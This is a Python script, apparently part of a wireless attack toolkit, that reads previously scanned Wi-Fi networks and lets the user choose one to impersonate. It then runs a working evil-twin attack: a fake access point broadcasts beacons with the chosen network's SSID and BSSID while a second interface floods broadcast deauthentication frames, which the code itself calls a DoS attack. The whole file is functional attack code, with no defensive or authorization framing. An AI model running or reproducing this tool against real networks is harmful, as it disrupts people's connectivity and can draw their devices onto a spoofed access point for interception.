import os
import threading
from scapy.all import *
import subprocess
import time  # Added for introducing a delay

# File path to the networks.txt file where results are stored by the network scanner
networks_file_path = "/home/randompolymath/Desktop/RedRidingHoodCompany/redridinghoodv1/Results/networks.txt"

def set_ap_mode(iface):
    """ Configures the interface to AP mode (master mode). """
    try:
        subprocess.run(["sudo", "ifconfig", iface, "down"], check=True)
        subprocess.run(["sudo", "iwconfig", iface, "mode", "master"], check=True)
        subprocess.run(["sudo", "ifconfig", iface, "up"], check=True)
        print(f"Interface {iface} set to AP mode.")
    except subprocess.CalledProcessError:
        print(f"Failed to set {iface} to AP mode. Please check the interface or permissions.")

def stop_ap_mode(iface):
    """ Puts the given interface back to managed mode. """
    try:
        subprocess.run(["sudo", "ifconfig", iface, "down"], check=True)
        subprocess.run(["sudo", "iwconfig", iface, "mode", "managed"], check=True)
        subprocess.run(["sudo", "ifconfig", iface, "up"], check=True)
        print(f"Interface {iface} set back to managed mode.")
    except subprocess.CalledProcessError:
        print(f"Failed to set {iface} back to managed mode. Please check the interface or permissions.")

def set_monitor_mode(iface):
    """ Puts the interface into monitor mode for DoS attacks. """
    try:
        subprocess.run(["sudo", "ifconfig", iface, "down"], check=True)
        subprocess.run(["sudo", "iwconfig", iface, "mode", "monitor"], check=True)
        subprocess.run(["sudo", "ifconfig", iface, "up"], check=True)
        print(f"Interface {iface} set to monitor mode.")
    except subprocess.CalledProcessError:
        print(f"Failed to set {iface} to monitor mode. Please check the interface or permissions.")

def set_channel(iface, channel):
    """ Sets the Wi-Fi interface to the specified channel. """
    try:
        subprocess.run(["sudo", "iwconfig", iface, "channel", str(channel)], check=True)
        print(f"Set {iface} to channel {channel}.")
    except subprocess.CalledProcessError:
        print(f"Failed to set {iface} to channel {channel}.")

def read_networks_from_file():
    """ Reads the discovered networks from networks.txt and returns them as a list of dictionaries. """
    networks = []
    if not os.path.exists(networks_file_path):
        print(f"File {networks_file_path} not found!")
        return networks

    with open(networks_file_path, 'r') as f:
        for line in f:
            # Expecting each line to be in the format: BSSID Vendor SSID Channel
            parts = line.strip().split()
            if len(parts) >= 4:
                bssid = parts[0]
                vendor = parts[1]
                ssid = " ".join(parts[2:-1])  # SSID can have spaces
                channel = parts[-1]  # Channel is the last part
                networks.append({"BSSID": bssid, "Vendor": vendor, "SSID": ssid, "Channel": channel})
            else:
                print(f"Invalid line format in {networks_file_path}: {line}")
    return networks

def display_networks(networks):
    """ Displays the available networks read from the file. """
    print("Available networks:")
    for idx, network in enumerate(networks, 1):
        print(f"{idx}. SSID: {network['SSID']}, BSSID: {network['BSSID']}, Vendor: {network['Vendor']}, Channel: {network['Channel']}")

def select_network(networks):
    """ Allows the user to select a network from the list of networks. """
    display_networks(networks)
    if not networks:
        return None
    choice = int(input("Select the network number to fake (1, 2, ...): "))
    return networks[choice - 1]

def send_deauth_packets(iface, target_bssid, target_client="ff:ff:ff:ff:ff:ff", count=100):
    """
    Sends deauthentication packets to the target BSSID (AP) and target client.
    If target_client is "ff:ff:ff:ff:ff:ff", the attack will be broadcasted to all clients.
    """
    dot11 = Dot11(type=0, subtype=12, addr1=target_client, addr2=target_bssid, addr3=target_bssid)
    frame = RadioTap() / dot11 / Dot11Deauth(reason=7)

    print(f"Sending {count} deauthentication packets to {target_bssid} (Client: {target_client})")

    for i in range(count):
        sendp(frame, iface=iface, verbose=0)
    print("Deauthentication packets sent.")

def create_fake_ap(iface, ssid, bssid, channel):
    """ Creates a fake access point using the SSID and BSSID of a selected network. """
    # Set the interface to the correct channel
    set_channel(iface, channel)

    # Ensure the interface is up
    subprocess.run(["sudo", "ifconfig", iface, "up"], check=True)

    # Add a short delay to ensure the interface is ready
    time.sleep(2)

    dot11 = Dot11(type=0, subtype=8, addr1="ff:ff:ff:ff:ff:ff", addr2=bssid, addr3=bssid)
    beacon = Dot11Beacon()
    essid = Dot11Elt(ID="SSID", info=ssid, len=len(ssid))

    frame = RadioTap() / dot11 / beacon / essid
    print(f"Sending beacon frames for {ssid} (BSSID: {bssid}) on channel {channel}... Press Ctrl+C to stop.")

    try:
        sendp(frame, inter=0.1, iface=iface, loop=1)  # Adjusted the interval to 0.1
    except KeyboardInterrupt:
        print("\nStopped sending beacon frames.")
    finally:
        stop_ap_mode(iface)

def stop_network_manager():
    """ Stops network manager to prevent interference. """
    try:
        subprocess.run(["sudo", "systemctl", "stop", "NetworkManager"], check=True)
        print("NetworkManager stopped to avoid interference.")
    except subprocess.CalledProcessError:
        print("Failed to stop NetworkManager.")

def start_network_manager():
    """ Restarts network manager. """
    try:
        subprocess.run(["sudo", "systemctl", "start", "NetworkManager"], check=True)
        print("NetworkManager restarted.")
    except subprocess.CalledProcessError:
        print("Failed to restart NetworkManager.")

def fake_ap_main():
    """ Main function to read networks from file, select one, and create a fake AP while doing a DoS attack. """
    subprocess.run(["ifconfig"])
    
    iface_ap = input("Interface to use for Fake AP (AP mode)?: ")
    iface_dos = input("Interface to use for DoS attack (Monitor mode)?: ")

    # Stop NetworkManager to avoid interference
    stop_network_manager()

    # Read networks from the networks.txt file
    networks = read_networks_from_file()

    if networks:
        selected_network = select_network(networks)

        if selected_network:
            # Use the channel from the selected network
            channel = selected_network['Channel']

            # Set up AP mode for the first interface
            set_ap_mode(iface_ap)

            # Set up monitor mode for the second interface (for DoS)
            set_monitor_mode(iface_dos)

            # Launch Fake AP in a separate thread
            ap_thread = threading.Thread(target=create_fake_ap, args=(iface_ap, selected_network['SSID'], selected_network['BSSID'], channel))
            ap_thread.start()

            # Launch DoS attack concurrently on the other interface
            packet_count = int(input("How many deauthentication packets to send? (default=100): ") or 100)
            dos_thread = threading.Thread(target=send_deauth_packets, args=(iface_dos, selected_network['BSSID'], "ff:ff:ff:ff:ff:ff", packet_count))
            dos_thread.start()

            # Wait for both threads to finish
            ap_thread.join()
            dos_thread.join()

        else:
            print("No network selected.")
    else:
        print("No networks found in the file.")

    # Set interfaces back to managed mode
    stop_ap_mode(iface_ap)
    stop_ap_mode(iface_dos)

    # Restart NetworkManager
    start_network_manager()

if __name__ == "__main__":
    fake_ap_main()
